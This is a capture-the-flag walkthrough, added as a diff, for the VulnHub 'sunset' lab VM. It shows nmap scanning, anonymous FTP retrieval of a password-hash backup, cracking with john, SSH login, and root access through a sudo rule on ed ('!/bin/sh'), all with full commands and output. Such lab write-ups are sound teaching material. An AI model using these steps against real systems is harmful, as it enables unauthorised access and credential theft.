@@ -1,0 +1,147 @@
+
+sunset
+
+https://download.vulnhub.com/sunset/sunset.zip
+
+When converting a VirtualBox OVA to a VMware Fusion VM, the networking breaks.
+While looking for a solution, I found some creds to use: sunset:cheer
+ip a
+My network interfaces are lo an ens33.
+vi /etc/network/interfaces
+Replace enp0s3 with ens33.
+Reboot.
+
+root@kali:~# netdiscover -i eth0 -r 192.168.1.0/24
+
+root@kali:~# nmap -Pn -n -T4 -p- --open -sV -sC 192.168.1.21
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 18:23 EST
+Nmap scan report for 192.168.1.21
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     pyftpdlib 1.5.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--   1 root     root         1062 Jul 29 00:00 backup
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|  Connected to: 192.168.1.21:21
+|  Waiting for username.
+|  TYPE: ASCII; STRUcture: File; MODE: Stream
+|  Data connection closed.
+|_End of status.
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
+| ssh-hostkey:
+|   2048 71:bd:fa:c5:8c:88:7c:22:14:c4:20:03:32:36:05:d6 (RSA)
+|   256 35:92:8e:16:43:0c:39:88:8e:83:0d:e2:2c:a4:65:91 (ECDSA)
+|_  256 45:c5:40:14:49:cf:80:3c:41:4f:bb:22:6c:80:1e:fe (ED25519)
+MAC Address: 00:0C:29:3F:17:EA (VMware)
+
+root@kali:~# searchsploit pyftpdlib
+Exploits: No Result
+Shellcodes: No Result
+
+root@kali:~# ftp 192.168.1.21
+Connected to 192.168.1.21.
+220 pyftpdlib 1.5.5 ready.
+Name (192.168.1.21:root): anonymous
+331 Username ok, send password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> ls
+200 Active data connection established.
+125 Data connection already open. Transfer starting.
+-rw-r--r--   1 root     root         1062 Jul 29 00:00 backup
+226 Transfer complete.
+
+ftp> get backup
+local: backup remote: backup
+200 Active data connection established.
+125 Data connection already open. Transfer starting.
+226 Transfer complete.
+1062 bytes received in 0.00 secs (866.4238 kB/s)
+
+ftp> bye
+221 Goodbye.
+
+root@kali:~# cat backup
+                                                                                                                                                                                                      I deleted the first line and the blank lines, which left me with this.
+
+office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.
+datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/
+sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0
+sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
+space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/
+
+root@kali:~# john backup
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 5 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Remaining 3 password hashes with 2 different salts
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
+Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
+Further messages of this type will be suppressed.
+To see less of these warnings, enable 'RelaxKPCWarningCheck' in john.conf
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+0g 0:00:01:22 79.44% 2/3 (ETA: 13:00:30) 0g/s 1575p/s 3119c/s 4683C/s 7python..7jumanji
+Proceeding with incremental:ASCII
+cheer14          (sunset)
+
+I let john continue to run and opened up a new Terminal.
+
+root@kali:~# ssh sunset@192.168.1.21
+The authenticity of host '192.168.1.21 (192.168.1.21)' can't be established.
+ECDSA key fingerprint is SHA256:n9ATwmONo6fCyPblqlvcO7WcIWZJMqBaqDdo/jYnLPI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.1.21' (ECDSA) to the list of known hosts.
+sunset@192.168.1.21's password:
+Linux sunset 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jan 17 11:47:44 2020
+
+sunset@sunset:~$ sudo -l
+Matching Defaults entries for sunset on sunset:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sunset may run the following commands on sunset:
+    (root) NOPASSWD: /usr/bin/ed
+
+sunset@sunset:~$ sudo /usr/bin/ed
+!/bin/sh
+
+# whoami && id
+root
+uid=0(root) gid=0(root) groups=0(root)
+
+# pwd
+/home/sunset
+
+# cd /root/
+
+# ls
+flag.txt  ftp  server.sh
+
+# cat flag.txt
+25d7ce0ee3cbf71efbac61f85d0c14fe
+
